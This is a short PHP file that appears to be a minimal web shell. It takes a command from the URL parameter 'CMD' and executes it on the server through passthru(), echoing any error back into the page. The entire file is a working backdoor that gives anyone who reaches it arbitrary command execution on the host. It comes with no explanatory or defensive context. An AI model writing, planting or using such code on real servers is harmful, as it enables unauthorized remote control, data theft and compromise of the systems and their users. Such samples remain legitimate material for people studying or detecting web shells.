<?php
    if(isset($_GET['CMD'])) {
        $cmd = $_GET['CMD'];

        try{
            passthru($cmd);
        } catch (Error $error) {
            echo "<p-class=mt-3><b>$error</b></p>";
        }
    }
?>